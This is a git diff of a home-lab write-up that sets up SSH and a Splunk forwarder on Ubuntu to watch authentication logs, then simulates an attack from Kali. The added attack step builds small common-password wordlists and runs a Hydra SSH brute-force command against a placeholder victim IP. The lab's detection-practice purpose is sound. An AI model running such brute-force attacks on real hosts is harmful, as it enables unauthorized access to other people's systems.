@@ -24,7 +24,7 @@ Objective
 
 Kali Linux 2025.2-virtualbox-amd64
 
-Ubuntu AMD 64-bit architecture
+Ubuntu AMD 24.04.3 TLS
 
 Network Interface: eth0 / wlan0
 
@@ -64,14 +64,14 @@ sudo systemctl start ssh
 sudo systemctl enable ssh
 ```
 
-**I checked SSH is running**
+I checked SSH is running
 
 ```
 sudo systemctl status ssh
 ```
 
 
- Verifica que SSH esté corriendo
+I Verificed SSH it's right
 
  ```
 sudo systemctl status ssh
@@ -97,14 +97,38 @@ Install
 sudo dpkg -i splunkforwarder-9.1.0-linux-2.6-amd64.deb
 ```
 
-Configura para monitorear logs de autenticación
+Configure to monitor authentication logs
+
+```
 sudo /opt/splunkforwarder/bin/splunk start --accept-license
 sudo /opt/splunkforwarder/bin/splunk add forward-server [IP_DE_TU_SPLUNK]:9997
 sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log -index main
+```
 
 ## poner sss aqui
 
+***Why this path?***
 
+SSH logs are stored in ```/var/log/auth.log.```
+
+Universal Forwarder is lightweight and specifically designed to send logs.
+
+**Port 9997** is the standard for receiving data in Splunk.
+
+**Step 3: Attak Simulation** 
+
+From Kali Linux
+I created a field users commons
+
+```
+echo -e "root\nadmin\nuser\ntestuser" > users.txt
+```
+
+# Crea un archivo de contraseñas comunes
+echo -e "password\n123456\nadmin\nletmein" > passwords.txt
+
+# Ejecuta Hydra
+hydra -L users.txt -P passwords.txt ssh://[IP_VICTIMA] -t 4 -V
 
 
 ## Summary 
